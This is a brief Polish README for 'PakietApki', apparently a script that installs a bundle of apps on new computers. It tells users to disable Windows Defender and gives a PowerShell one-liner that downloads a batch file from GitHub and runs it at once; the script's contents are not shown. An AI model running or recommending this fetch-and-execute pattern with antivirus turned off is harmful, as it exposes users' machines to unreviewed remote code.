# PakietApki
użyj na nowe komputery i wyłącz Windows Defender bo będzie bez sensu płakał, mozna normalnie przejrzeć kod

powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/szubixyt-dev/PakietApki/main/PakietApki' -OutFile $env:TEMP\PakietApki.bat; cmd /c %TEMP%\PakietApki.bat"
